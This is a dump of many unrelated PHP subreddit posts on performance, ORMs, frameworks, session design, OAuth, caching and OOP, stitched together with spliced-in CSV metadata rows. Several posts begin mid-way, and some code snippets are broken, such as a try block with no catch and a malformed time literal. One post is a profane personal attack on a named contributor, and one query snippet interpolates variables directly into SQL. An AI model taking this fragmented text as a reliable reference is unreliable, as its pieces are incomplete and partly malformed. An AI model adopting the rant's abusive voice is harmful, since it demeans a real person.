The first argument is an example date which is parsed and used to format the second argument. Stamp supports formatting month names, abbreviations, numbers, days with or without leading zeroes, two and four digit years, ordinals, times, etc. Any extraneous text is passed through unmodified. For the second argument, you can pass in a timestamp, a date object or a string (will be passed through strtotime).

It is tested and usable, though I need to do some performance work as it could be a bit heavy especially if used in a loop of large dates.

The application is used for logistics planning, staff management, etc. Practically everything. Unfortunately, it started off as a prototype (over four years ago) and it quickly spiraled out of control, simply because a) new requests for features kept coming in and b) there was never any time allotted for a rewrite. To make things worse, it seems as if some of the original creators weren't too knowledgeable about PHP or database design. It's either that or they were simply overcome by requests for new features and stopped caring (a likely scenario, considering the face-to-face relationship between users and programmers).

* Over 1TB of data is retrieved from the database on a monthly basis.
* Millions of rows. Large tables.
* The most used page takes 30 seconds to fully load. The initial page loads in 2 seconds while the iframe containing the bulk of the data usually takes about 28 seconds to fully load (it loads bit by bit). Users are constantly refreshing this page as they need live up-to-date data.
* A previous employee decided to write his own custom templating engine for the page in question, which is made up of multiple objects with multiple includes that are dedicated to doing simple things such as outputting a single &lt;td&gt; tag.
* Our DBA reckons that the amount of IF statements inside IF statements is contributing to the slowness. I'm not sure I fully agree with that. From what I've read, PHP is rarely the bottleneck. 
* We all agree that the sheer amount of data we're attempting to render on the page is one of the biggest issues (a lot of data with tables inside tables). Unavoidable to a certain degree. Profilers show this to be one of the biggest issues, alongside queries.
* Multiple JS includes that I'm afraid to touch, simply because the files in question are used by other parts of the app. I could put them all into one file and cut down on the number of HTTP requests, but then, I'd be forced to leave the other files behind, simply because some obscure page is also using them. This means duplicate code. Also, the 20+ HTTP requests in question aren't actually that big of an issue, simply because our DBA / server guy has some caching going on, which means that the majority of the files are served together side-by-side within 35ms. 
* Today, I shaved about 8-10 seconds off the load time by turning ""sub data"" into data that is retrieved on-demand via ajax. Before, all sub data was being printed out into hidden divs. 
* Profiled the main query on the page and found out that it wasn't using one of the 10 indexes that existed. It was using filesort. Couldn't seem to force MySQL to use the index we wanted? As a result of my prodding, the DBA took interest and suggested creating a temporary table for all data relating to today's date, which would allow us to work from a smaller subset of the data. I'm not too sure about temporary tables and their usefulness in regards to performance? How long will a temporary table last?
* Before I made the sub data fix, we had queries inside loops. These queries touched tables with millions of rows, using no indexes.
* Page in question consists of 10K+ lines of code.

Even though I'm feeling a bit overwhelmed, I see it as a challenge and an opportunity. A lot of people never get to work with this sort of mess / traffic. I'm just looking to see if you guys have had any similar experiences or if you guys have any tips / advice to give me?

Specifically, it was a statistics piece that shows revenue by month, week from transaction dates stores in DATETIME fields.

Here was the original query

    WHERE (transactions.transaction_date &gt;= '{$period['week_start']}' AND transactions.transaction_date &lt;= '{$period['week_end']}')

The problem was that in a month like July that has 31 days, it was only returning transactions up to the 30th for the last week (2012-07-29 - 2012-07-31)

I thought the fix was to use BETWEEN... however, that didn't work well either until I added the time.

    WHERE (transactions.transaction_date BETWEEN '{$period['week_start']} 00:00:00.000' AND '{$period['week_end']} 23:59.59.997')

I've enjoyed learning PHP (almost a year and half) and I try to challange myself regularly to ensure I'm writing the best code I can. 
So, after getting comfortable with the language I've begun creating an MVC framework for personal projects, fitting to my own style and taking inspiration from my two favourite frameworks: 'Yii' and 'CodeIgniter'.

My request is similar to that of 'hiii' who created the '$50 for a code review' thread. I originally was going to offer money for code review by competant programmers but after reading the comments in that thread it appears letting others know about your github repository is more appropriate. 

So, I present my little project 'miniMVC', hosted at https://github.com/Alem/miniMVC. I'd be happy to hear any and all critique, but please keep it constructive/relevant ( ie: no 'the name sucks', 'just use [framework]', 'you smell like cabbage', etc. ).

Also, I hate taking and not giving, and I liked how 'hiii' donated to St Jude Children's Hospital. So in the same spirit I'd be happy to donate $100 to a charity choosen by anyone.

Cheers


TLDR: Wrote MVC framework for personal use, need constructive criticism, donating $100 to charity.

The salt starts with $2a$, which means I'm using bcrypt aka Blowfish. As you can see, while the strings are obviously different, the hashes are exactly the same, so it looks like crypt() is reading the string just until the null byte. Shouldn't crypt() be binary safe?

Now for a little back story. I've been doing web design for the last 5+ years. In that time, I've never been able to find a simple web photo gallery that would allow me to include a bunch of random photos on a web page. By ""simple"" I mean simple enough for a non-developer to set up and manage. So a few years ago when I wanted to learn PHP, I decided that creating a photo gallery was a great way to lean and created the first version of UberGallery.

Fast forward almost two years, my PHP knowledge has been slowly growing and I started to learn about object oriented PHP. In order to further my knowledge about the object oriented part of PHP I decided to re-write my gallery script using OOPHP, thus UberGallery 2.0.0 was born.

I know I'm probably not the best coder around, and I'm sure this script could use lots of improvement, but I wanted to share this with you for two reasons: 1) I feel this script could benefit some of you looking for the same type of ""simple"" web photo gallery I once was and 2) to express how easy it was to learn PHP when I had a goal in mind that I was interested in.

Other times I hang about on stackoverflow.com looking to see if I can solve people's problems.  The motivation for that disappears though because someone else can nearly always submit the correct (and probably better than mine) answer while I'm working it out.

I've been tempted to learn a framework a few times but that stops when I realize that for the small-scale things I do it would actually be counter-productive to implement stuff in a framework.  I would end up with something more complex than a non-framework built equivalent and it would be harder for me to re-understand what my code is doing if I were to come back to it at some future date to make a change.

I feel like my projects could benefit from OOP,  but when I actually think about it - I'm rubbish at conceptualizing my projects into OOP.  For example my website is a gallery - I think there should be a 'photo' class, then it will have a 'show' member function, and a 'getSection' member function ('section' in my site refers to a sub gallery, like 'miscelaneous' or 'landscape') and then it occurs to me that this wouldn't improve much on the way it works now.

In short - I would be trying to re-invent the wheel if I were to try to re-write my website in OOP,  so I lack motivation to do that.

1293783856.0,29,self.PHP,eu38n,Jeffm: isset isn't a faster version of array_key_exists (and other lessons),60,31,31,http://www.reddit.com/r/PHP/comments/eu38n/jeffm_isset_isnt_a_faster_version_of_array_key/,"I used to be a major contributor to a little known PHP framework. Now, to be honest, the whole thing was a total piece of shit, and I eventually stopped contributing to the project. There were a few other active contributors though, so development continued.

Part of the framework included a very simple ORM, which could, among many other nifty things, insert records into a database from simple PHP arrays, like so:

    $mymodel-&gt;insert(array(
        'first' =&gt; 'John',
        'last' =&gt; 'Doe',
        'dob' =&gt; '1981-01-29'
    ));

Pretty simple stuff. If a field is missing from the array, the ORM would look up a default value declared in the model. If you pass ""NULL"" as a value for a field, null gets inserted into the database for that field.

Deep down in the framework I had some code:

    for ($this-&gt;fields as $field)
    {
        if (!array_key_exists($field-&gt;name, $row))
        {
            $row[$field-&gt;name] = $field-&gt;default;
        }
    }

*(this is an extreme simplification, but you get the idea)*

Anyways, a new release was announced today, and I figured I'd go back and look at the change logs. About a year ago, one of the guys that joined the team about a month before I left committed this:

&gt; isset is faster than array\_key\_exists. Replacing a ton of slow code from incognito9876.

*(this was one commit among a few others that call me out by name)*

The change set consisted of over 200 changes, all of them were uses of array\_key\_exists being replaced with isset. In fact, *every* instance of array\_key\_exists had been replaced with isset.

In fairness, the framework has some pretty shitty performance, and desperately needed to be re-architected in many places to improve performance. I don't mean like, by the 3ms per page load that this change amounts to, but well thought out, tested and measured improvements, preferably by using a profiler, rather than find-and-replace based on some queer notion that using isset (when what you really need to know is whether or not an array key exists or not) will fix all of your performance problems.

So now that bit of ORM code reads like this:

    for ($this-&gt;fields as $field)
    {
        if (!isset($row[$field-&gt;name]))
        {
            $row[$field-&gt;name] = $field-&gt;default;
        }
    }

So...when we specify NULL, it'll be incorrectly replaced with the default value for the field. Great.

Let's run the test suite.

352 tests fail out of over 2000 for a variety of reasons, including an ORM integration/validation test that I wrote, which attempts to insert null, and checks that it was inserted correctly.

**To jeffm:**

I hope you're reading this Jeff.

Not only are you an asshole, jeffm, you're an idiot too. Maybe if you weren't so fucking lazy you could run--, or, God forbid, maintain-- the test suite. Not a single commit was made to the tests directory in like two and a half fucking years, and the last commit has my name on it.

I know my code was fucking slow, but using the *correct* function had nothing to do with that. Maybe if the commit logs weren't littered with insults directed at me by name I'd be willing to help work on some of the performance issues.

In conclusion, go fuck yourself jeffm.

Thanks,

incognito9876

Partly this is dogfooding; the client wants to expose the API to allow for alternative front-ends (e.g. native mobile app, or a microsite for another part of the business), and building the main site itself on the API ensures that it's fit for purpose. Another reason is so we never have to rebuild the whole thing again :P

Initially I'd planned to build the API with the [Slim micro-framework](http://www.slimframework.com) (with a DI container), the [LOEP's OAuth 2.0 Server](https://github.com/php-loep/oauth2-server) library and probably Doctrine ORM (or just the DBAL), and serve that over HTTPS, but there are two things I'd like advice on:

1. Is OAuth 2.0 the right way to secure an API? If not OAuth 2.0, then what? OAuth 1.0a makes native mobile apps trickier, straight API keys make browser-based API clients inadvisable, etc. Any advice? [Warnings](http://blog.springsource.org/2011/11/30/10317/)? What have I missed?

2. Micro-frameworks are quick and light, and applying OAuth 2.0 as a middleware layer in Slim (or [Silex](http://silex.sensiolabs.org)) is smart and tidy, but this project (a corporate video sharing site with comments, ratings, a recommendation engine, blog, transcoding, multiple levels of authorisation) is not a small one (mind you I wouldn't call it *big* either), and I know it's difficult to remain disciplined and code consistently in an unstructured environment. Full-stack frameworks like Symfony2 provide structure and conventions for both code and configuration, which make it easier for colleagues new to the project to learn more quickly. But Symfony2 is slower, and the [FOSOAuthServerBundle](https://github.com/FriendsOfSymfony/FOSOAuthServerBundle) seems unnecessarily complex and abstract (which kind of defeats the point). Are there coping strategies for consistent coding in micro-frameworks, or better alternatives to FOSOAuthServerBundle? How do I keep my controllers slim in Slim?

Finally are there strong opinions either way on the entire approach? Any advice or gotchas to look out for?

Edit: Thanks for all your advice! Since finding and configuring a working OAuth 2.0 API server was so fiddly, I've published [a skeleton Silex API app](https://github.com/inanimatt/silex-oauth2-api) on GitHub. Swapping Silex out for Slim + Pimple is pretty straightforward, if that's your preference.

The site is written in PHP and interfaces with a MySQL server on the same machine (LAMP). I use a connection from the php portion to access low security credentials on the MySQL Database, which then gives access to higher security information if credentials pass. 

My question however is regarding security between the remote user and the php server. Since php is servver side, how can i be certain that user login information is properly encrypted on the client side before being sent to the server? Do I need to go the extra step of using javascript for the client side, or possibly register for https authentication?

Bonus question: Is it necessary to have the extra levels of security and encryption between the php and mysql database since they're on the same machine? Perhaps that question also gives a clue as to my level of expertise.

EDIT: Thanks for all the information. It seems that SSL is the way to go, so I look forward to getting that set up. I'll begin with StartSSL (free fits my budget well) to get the hang of it. Also, I've already set things up with hashing, salting, peppering, as well as sanitization. I just need to make some changes to how MySQL queries are run. Right now they use variables which which come from results of user input instead of direct user input, with the two exceptions of username/password.

It's just a big pile of spaghetti code....HTML intertwined with PHP and incline css with javascript here and there. 

They are already profitable and the founders wrote the code themselves so I'm a little reluctant to bring up the idea of a rewrite...plus the fact that it's a startup doesn't help for the case of a rewrite either since resources are slim. I'm thinking that I keep trying to study and understand the code and once I feel comfortable then I will jump in to a MAJOR refactoring process. 

Anyone have any experience or advice that would help me out?

**EDIT:** Thanks for the responses everyone. I've already ruled out the rewrite since the nature of a startup is to move forward and move fast, not take a step back to write something twice. The advice has been great. I'm going to sit down with them soon and discuss plans to clean up the code and get a sense of their expectations. The founders have been busy the last few days since we're getting ready to move into a larger office so I haven't had many opportunities to sit down with them yet.

How, then, to keep a user logged in when they check a ""remember me"" box? What's the proper method of making sure they've not simply modified their cookie to try to login as a different user?

Should I store only their user ID in the cookie, and match it up against CI's database record, making sure useragent and IP address are the same? This seems like it's putting too much trust in the user.

Storing a password, even a hash, in the user's cookie seems like a Really Bad Idea to me.

A simple solution would be something like checking their cookie, and allowing them limited access to their account, and when they attempt to access anything important, require them to revalidate their password. Is this the accepted method?

For those that don't know, CI's cookies are encrypted using a unique string that each developer sets... but that still doesn't seem secure enough for me.

The state of event-driven programming in PHP sucks. Existing libraries require non-blocking semantics for computational concurrency. These libraries advertise non-blocking IO and event-driven concurrency. They make grandiose claims about ""async"" but don't tell you that for any of it to be useful you need
asynchronous and non-blocking language features to go along with it.

Some non-blocking libs endeavor to expose non-blocking APIs for popular use cases (MySQL, etc). Meanwhile, others provide the event loop infrastructure and say, ""knock yourself out,"" but without a way to multiprocess these event loops have extremely limited value for anything but CLI scripts.

Node.js became popular and we immediately got the standard wave of PHP knockoffs. But these libraries didn't realize that PHP simply isn't javascript; it doesn't have the asynchronous capability baked into the language. This simple fact demonstrates a severe lack of creativity on the part of the devs who created the current set of event-driven PHP tools. What's more, these libraries are extremely limited and wrongheaded in the first place. They're a suboptimal solution to the problem of event-driven concurrency because they enforce the use of non-blocking APIs to accomplish anything. PHP is so useful in large part because of the huge set of compiled tools and extensions it has at its disposal. Requiring event-friendly APIs eliminates almost all of these tools as a possibility. A
good asynchronous solution for PHP **MUST** allow access to the vast toolkit available to synchronous PHP code.

Now, the gearman extension is a step in the right direction because it lets us distribute processing across network topologies. Unfortunately it's totally useless in the event-driven arena because you *can't actually use gearman to return results asynchronously;* it's only useful for simple cases where we don't care about the results of our asynchronous work.

The emerging pthreads extension is another option, though it's still very-much under-development and doesn't solve the problems of distributed processing, failover and redundancy. Also, there are many who argue that threading is an untenable solution in the first place (myself included).

So let me suggest an alternative ...

[**AMP: Asynchronous Multiprocessing in PHP**](https://github.com/rdlowrey/Amp)

AMP makes concurrency and distributed processing a reality for PHP coders of any skill level on any operating system and without the need for any extensions. It lets you transparently dispatch RPC-style function calls to remote job servers and/or worker process pools with the same API and eliminates the need for non-blocking APIs because it allows you to write synchronous code that is then invoked and returned asynchronously.

A simple demonstration:

    $dispatcher-&gt;call($onResultCallback, 'sleep', 1); // returns immediately
    $dispatcher-&gt;call($onResultCallback, 'sleep', 1); // returns immediately
    $dispatcher-&gt;call($onResultCallback, 'sleep', 1); // returns immediately

With AMP we can execute this code in **one second** instead of the **three seconds** that would be required to make three synchronous sleep calls. What's more, we can setup processing nodes on several machines and get failover and ZMQ-style distributed processing for free while keeping our application blissfully unaware of the network infrastructure needed to make it all work.

Benchmarks are pointless and only applicable to a specific moment in time on specific hardware. So I'll just mention this in passing: currently Amp is able to dispatch and return ~15,000 function results asynchronously per second on my consumer-grade four-year-old laptop. It's not perfect yet, but it's getting there.

I've been working as a developer for a few years now, and in that time I've done most of the things I can think of. I've built my own frameworks and designed/programmed entire web-services as well as native software for both startups and a few large companies. 

What I've noticed is that I tend to use the same tools and platform over and over time after time. Ofc, that is due to the fact that I am most comfortable with them. But to be honest, I feel like I need to take a moment and explore new grounds.

I do most of my work using PHP, Java (Android), MySQL/SQLite, MVC, REST architecture, etc.

I tried RoR a while ago but I did not really like it. And to be honest, I don't find there to be a huge advantage in learning new languages. Mostly because the same concepts are applied in most languages using different syntax, which seems to be a bad ROI at this point.

So what would you guys suggest? :)

(testability),30,7,23,http://www.reddit.com/r/PHP/comments/10hank/avoid_static_methods_at_all_costs_testability/,"Whenever I see a discussion mention unit testing and static methods together, static methods are usually labelled as the enemy. I understand the reasoning is based on the difficulty of isolating a class/system under test that is making various static calls. That being said, outside the context of tests, I see a lot of elegance and value in using static methods for certain cases.

To put it another way, I get it: testing is important, and building your codebase in a manner that is easy to test should be a priority. However, sometimes I feel like I have to compromise on the elegance of my code in order to maintain testability. Cases where perhaps a static method makes sense, but end up having to perform some coding acrobatics in order to avoid it.

Is this a common challenge, something many developers face and must balance between? Or am I misguided in how frequently static methods can be the most elegant solution (before taking testability into consideration)?

I've heard many say that if your code isn't testable (using static methods being one reason), it can indicate that the code you have written is flawed in its design. Right now I question this assertion (but don't dismiss it, I am undecided). I'd love to hear some experienced opinions on this if any of my fellow Redditors/developers would like to share.

1347392052.0,24,self.PHP,zq33i,PHP architects out there... what’s your preferred way to “fake state”?,31,7,45,http://www.reddit.com/r/PHP/comments/zq33i/php_architects_out_there_whats_your_preferred_way/,"As we know the web does not have “state”. IMO this is mostly a feature. But we still need to build feature rich web apps that have a ‘stateful feel’. If you need an example, think of a “user” who is logged into web app like an elearning or community site. On each page is held or displayed some information about him, such as user preferences, last login date, username, email address, short bio, etc.

So far as I know there are 3 approaches to “fake the state”. There may be others and please let me know. I do not profess to know everything about php or building scalable web apps. But scalability and reduction of resources is the priority here.

Approach #1: Use cookies (for example $_COOKIE[‘user_id’], $_COOKIE[‘user_first_name’]). You will of course need to combine and serialize these or somehow encrypt them to prevent user tampering.

Approach #2: Use cookies or session to hold an encrypted ‘user_id’ and then load the rest from the database on every request.

Approach #3: Use session variables (or better yet) a single session variable object as a “user container” (could also be an array of course if you are into that) for example $_SESSION[‘user’]-&gt;user_id, $_SESSION[‘user’]-&gt;user_first_name, $_SESSION[‘user’]-&gt;user_last_name, etc.

My Analysis of these approaches:

Aproach #1 using big encrypted cookies worries me for a few reasons. I personally see cookies as a liability. No matter how well they are serialized or encrypted, there is still a danger of tampering. Plus as the cookie grows in size there could be some issues. To put it bluntly, all cookies suck... but big cookies suck more.

Approach #2 would be to hold just the “user id” in a session or encrypted cookie and load the user object from the database on every request. This would keep memory usage down but would necessitate hitting the database on every request to rebuild the “user object”. This is the approach I have seen the most often. Often one must save state to database as well at the end of every request as well thus adding more database calls.

Approach #3 with sessions is how I like to do it. It prevents me from hitting the database on every request. It prevents me from storing anything besides the session id on the client’s computer. The penalty of course is server memory usage, but even if we are talking about 100 users logged in, each with a 20K of session data, it’s still only 2 megs of session data being held. Hardly enough to get worried about. IMO this allows for quick and inexpensive “retrieval” and “saving” of data. Of course you still need to save the session to the database once in a while... but certainly not every request (of course this depends on the application).

The trouble is I don’t see this approach very often in other frameworks, tutorials, etc that worries me. Why? Am I doing something  cool? Rather ordinary? Or am I missing something potentially dangerous? At what point would the session approach start to slow an average server? 200 users? 300 users?

It surprised me that even he continued to have the *wrong* impression that you're supposed to catch all Exceptions.

Many new programmers don't have Exceptions explained to them very well. To start off, you should never have an exception-catching block that looks like this:

    try {

        die($e-&gt;getMessage());

Why? Because you've just **limited** your debugging information unnecessarily, without resolving the Exception in any way other than to bail out.

PHP, when it encounters an uncaught Exception, will bail out and provide you debugging information on that exception. By catching all exceptions of the type Exception, you're committing a programming sin. You should never write code to simply bail out of execution on an Exception.

Instead, you should be specific with your exception catching. If you're executing some code that you find is throwing, for instance, a PDOException, you should only catch it if you can recover from it. Recovering from it can be anything from re-trying your connection, to simply letting your user know a connection could not be established, and letting the user figure it out.

If you cannot resolve an exception, let it be. If you catch an exception to try to resolve it, and cannot, then re-throw it.",,False,,t5_2qh38,False,,,True,t3_lq4ot,http://www.reddit.com/r/PHP/comments/lq4ot/leave_those_exceptions_be/,

For awhile now I've been working on this caching library as part of a larger project, and recently I decided to break it into its own project. Stash has a couple of features that really distinguish it (in my opinion at least) from other libraries.

* Hierarchal Storage - items are stored using 'keys', which are virtual directories similar to a filesystem. There are no built in limits to how deep they can be nested, and deleting parent keys will recursively clear out every child key.

* Interchangeable Storage Handlers - Stash uses different storage engines for the cache pool. Existing handlers include filesystem, sqlite, apc, and memcache (with support for xcache coming soon).

* Flexible Storage - Stash stores every PHP type but resources (since storing database connections or file pointers isn't easy). It uses the least intensive encoding possible, only serializing when necessarily.

* Staggered Handlers - Multiple handlers can have stacked on top of one another using a special handler. This lets you mix and match any handlers, and as many as you'd like. For example, you could use APC with a small amount of memory backed up by the Filesystem with a lot more space.
   
   
On top of that there are a lot of smaller features that I'm really happy about. Stash distributes cache misses, does request-only caching without a backend, and a ton of other fun things. Best of all it is [really simple to use](http://code.google.com/p/stash/#Example).
   
   
I wanted to share this with you guys for two reasons, one of which is completely selfish. Although I've build out a test suite using phpunit (with 99.28% code coverage) I've only been able to test it on a few systems (osx, debian lenny, debian squeeze- all php5.3). If anyone using a different system runs into any issues I would *really* appreciate it if they could run the test suite to help me debug it.

I have a huge site and application built in a PHP framework, which has tons of includes, and loads up plugins on-the-fly, and builds huge arrays of data on startup based on traversing file paths and files for other functions to call, etc.  Startup time is a beast, and the framework overhead gets to be a lot on certain pages.

My hypothesis is that if I could, say, run a single URL through a profiler like Xdebug, multiple times so I can capture all of the various states the site generates for that URL, and build a map of all the functions it calls, I could extract all of those functions from all of those files and put them in a single PHP file, and this would be faster and use less memory to start up and run than having the whole framework and all the other overhead, and it would let us load-balance and optimize at the URL level instead of averaging across the whole site.

Is this a crazy idea?  Is this possible?  Is profiler (callgrind) output the way to go, or should I be figuring out something like HipHop's static analyzer (it's a mix of OO and procedural PHP)?  Has anyone done this?  Is there somewhere else I should be asking (StackOverflow)?

I've been using ajax in my applications and from my experience, responding in HTML in most cases is easier. However, since we can't handle data on client side when it is responded as HTML, sometimes we need to work with JSON data. For example, ""response.login_status"" could easily be handled in client side. We can tell client to do different things depending on response. This approach requires more coding on client side but it ""feels like"" it is a better approach, since I have advantages like handling responde differently on client side/have additional clients like desktop-mobile etc and it can be a slight advantage when working with front-end developers.  Nowadays, I don't respond HTML except for GET requests (e.g loading requested page without layout), rest is all JSON.

However, my JS files are usually crappy and just contains bunch of different functions since I don't use a javascript MVC/MVVP framework yet.

Can we do such things on client side, for example?

     response('post', 'account/login'), function(response) {
          //Handles JSON returned after POSTing to account/login URI

          if(response.status === 'error')
               Modal.open('Could not login: ' + response.error_message');
          else
               Remove Register and Login links
               Add ['My Account', 'Logout'] to the navigation
               Get user's online friendlist (This is also going to be JSON, which will be handled elsewhere)
               Get user's notifications
               Other stuff
     });

     response('get', ':any'), function(response)
     {
         $('#content').html(response); //basic get requests with ajax, PHP responds non-layout version of page
     });

This idea looks slightly better than my current client coding since we can define routes to handle things so maintaining JS will be easier.

Basically, I want to know if there is a better, more elegant, more flexible approach on data transfer between server and client. HTML? JSON? A JS framework? Something better which I don't know?

**Question 2:** 
I tend to gather whatever is necessary to generate a page and respond them all in once. Like;

    View::make('usercp.my_profile')
         -&gt;with('user', Auth::user())
         -&gt;with('friends', $this-&gt;getFriends(Auth::user()-&gt;username))
         -&gt;with('notifications', $this-&gt;getNotifications(Auth::user()-&gt;username))

So page generates.

However, in some websites, I see page generates once, then they put loading icons to some divs, make request to PHP and pull information afterwards, append appropriate areas. It's like, you login, see your profile page, your ""friends div"" has a loading icon, client automatically makes a call to ""ajax/get_friends.php"", ""ajax/get_notifications.php"" update appropriate divs.

What kind of approach is that? It sounds like bad practice to me since there will be 3 requests instead of 1 and it will eventually lead to performance related issues. However, core aspect of page will load faster so it can be a bonus to user experience.

If you want to reference line 3 in a review you would type ""@3"" in your comment which will be converted to a link that, when clicked, will flash line 3 red for a few seconds. If you want to reference a block of code you can type ""@3-5"" which will do the same thing for lines 3, 4, and 5.
* I got some feedback on changing the top nav to increase contrast. I might have to come up with a different color scheme for that but I did change the blue and it makes a bit of a difference.
* Several people commented that they didn't notice the red comment marker on the right so I added an extra marker on the left.
* The biggest change of this release was to the home page which now shows all reviews with some infinite scrolling. You can also filter the displayed reviews to a certain language. I plan on refining this some more but I think it's a good first effort.

It is basically a site for doing code reviews. I just finished my latest sprint and wanted to share.

http://codetique.com

In case you haven't seen it before it has pastebin style review creation, but you can click on any line in a review and leave a comment.

The new features in this release are:

* Email alerts (If you have an account you will get emailed if someone leaves a comment on your review or replies to your comment)

* Made a simple about page for more information. 

* Comments are now threaded, reddit style.

* Some comment formatting similar to reddit (see the formatting help link on the left of the comment form under the cancel button).

* Comment claiming allowing any user with an account to take over any anonymous comment.

* Several small bug fixes and enhancements.

1329646259.0,23,self.PHP,pwbpw,"Picking the right framework, should keep up with technology for at least ten years.",25,2,44,http://www.reddit.com/r/PHP/comments/pwbpw/picking_the_right_framework_should_keep_up_with/,"The company where I work made their own CMS system about ten years ago. Is has all the functionality but lacks OOP principles. There are several hacks in it and overall, it's just bad code. Last week we even had a script-kiddy break in and steal some user data. It's just time for something new, we all agree. 

The things we need to keep in mind is that this should be a simple framework which allows rapid development for all types of developers. On top that framework, we should be able to create a CMS. Everything should be easy here since the people who work with it aren't the best 'computer people'.

My problem is this: Apart from me, no one really knew what version control or even ORM was. You could say I'm the only experienced developer there on a higher level. I don't see how this should be a problem. It does bring up some doubts on which framework I should choose while keeping some wanted functionality in mind. What I've come up with so far:

* LESS CSS parsing
* Hooks
* ORM
* Some easy way to deploy future updates to clients while keeping custom work intact

These are absolute demands, with these items I thought up a basic structure of a master-client scenario. We have this master CMS server which can deploy client CMS applications with just FTP details. In general, the server and the client should be able to communicate to each other for updates, back-ups and whatever not. 

I really like Symfony 2, the down side is I'll be the only one who will be able to maintain it. I've thought about CI but they don't have proper ORM with schema generation. So what about creating a very minimal core with extensibility in mind? Everything should be plug-ins. In that case we have a minimal framework on which we can easily create custom applications.

I'm not sure, but could this really be the case in which creating something of your own is the preferred go-to way? I could see myself creating a bunch of abstract classes and some generated docs out of docblocks for the people that should create these plug-ins.

Traits, however, are huge to me. Horizontal reuse is a Big. Fucking. Deal.

I've been rolling solutions using [Decorator](http://en.wikipedia.org/wiki/Decorator_pattern) for years now, and they're really needlessly complex, and difficult to understand.

I've been reading online tutorials on OOP, but I don't think that I'm interpreting it correctly.

From what I gather, it seems that OOP classes are the same as any standard function and the only difference is that they can be used on a more global scale.

For example, if I have an ""add friend"" feature on a website, I could have 1 page that allows to add friends and in that case I'd use a simple function on that single page. OR if there are multiple ways and multiple pages that I can add a friend on (like facebook), I'd create an 'addFriend' class in a separate file, then use import to include it on any page I'd like.

Is that kind of the point of OOP? I think that I'm oversimplifying its benefits and usage. Is anyone willing to enlighten a noob? I'd appreciate it.
